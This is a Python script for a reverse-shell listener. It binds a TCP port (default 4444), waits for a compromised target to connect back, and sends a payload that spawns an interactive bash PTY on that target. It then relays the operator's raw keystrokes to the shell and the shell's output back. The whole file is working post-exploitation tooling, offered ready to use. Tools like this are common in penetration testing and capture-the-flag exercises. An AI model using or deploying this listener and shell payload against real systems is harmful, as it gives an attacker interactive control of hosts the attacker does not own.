import socket
import select
import os
import termios
import tty
import signal
import argparse
import time
import sys

def signal_handler(sig, frame):
    """
    Handles SIGINT (Ctrl+C) to ensure the terminal settings are restored 
    before the script exits. This prevents your terminal from staying in 'raw' mode.
    """
    if 'old' in globals():
        termios.tcsetattr(0, termios.TCSADRAIN, old)
    print("\n[!] Exiting...")
    sys.exit(0)

def build_listener(host, port):
    """
    Creates a TCP socket, sets it to reuse the address (to avoid 'Address already in use' errors),
    binds it to the specified host and port, and starts listening for incoming connections.
    """
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind((host, port))
    s.listen(1)
    return s

def main():
    # Set up argument parsing for flexible usage
    parser = argparse.ArgumentParser(description="Simple PTY Shell Listener")
    parser.add_argument("-p", "--port", type=int, default=4444, help="Port to listen on")
    parser.add_argument("-H", "--host", type=str, default="0.0.0.0", help="Host to bind to")
    args = parser.parse_args()

    # Register the signal handler for graceful exit
    signal.signal(signal.SIGINT, signal_handler)

    print(f"[*] Listening on {args.host}:{args.port}")
    
    try:
        s = build_listener(args.host, args.port)
        conn, addr = s.accept()
        print(f"[+] Connection from {addr[0]}:{addr[1]}")

        # Send the payload to spawn a fully interactive PTY shell on the target.
        # We use \r\n because many network services expect a carriage return + line feed.
        conn.sendall(b'python3 -c \'import pty; pty.spawn("/bin/bash")\'\r\n')
        
        # Give the target a moment to execute the python command and initialize the shell
        time.sleep(0.5)

        # Save current terminal settings and switch to raw mode.
        # Raw mode disables local echo and line buffering, allowing us to send 
        # keystrokes directly to the remote shell.
        global old
        old = termios.tcgetattr(0)
        tty.setraw(0)
        
        try:
            while True:
                # Use select to monitor both stdin (keyboard) and the socket (remote shell)
                r, _, _ = select.select([0, conn], [], [])
                
                for fd in r:
                    if fd == 0: 
                        # Input from local keyboard: read and send to the remote shell
                        data = os.read(0, 4096)
                        if not data: break
                        conn.sendall(data)
                    else: 
                        # Output from remote shell: receive and write to local stdout
                        try:
                            data = conn.recv(4096)
                            if not data: break
                            os.write(1, data)
                        except ConnectionResetError:
                            print("\n[-] Connection closed by target.")
                            break
        finally:
            # Always restore terminal settings when the loop finishes
            termios.tcsetattr(0, termios.TCSADRAIN, old)
            conn.close()
            s.close()
            
    except Exception as e:
        print(f"[!] Error: {e}")
        if 's' in locals(): s.close()

if __name__ == "__main__":
    main()
